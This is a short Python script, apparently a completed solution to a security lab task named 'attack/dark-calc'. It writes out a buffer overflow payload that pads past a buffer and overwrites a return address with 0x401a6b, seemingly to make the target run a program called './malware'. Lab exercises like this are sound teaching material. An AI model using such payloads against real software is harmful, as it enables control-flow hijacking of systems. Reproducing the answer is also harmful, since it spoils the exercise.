#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys, struct
p64 = lambda x: struct.pack('<Q', x)
payload = b'./malware\x00' + b'A' * 14 + p64(0x401a6b)
sys.stdout.buffer.write(payload)
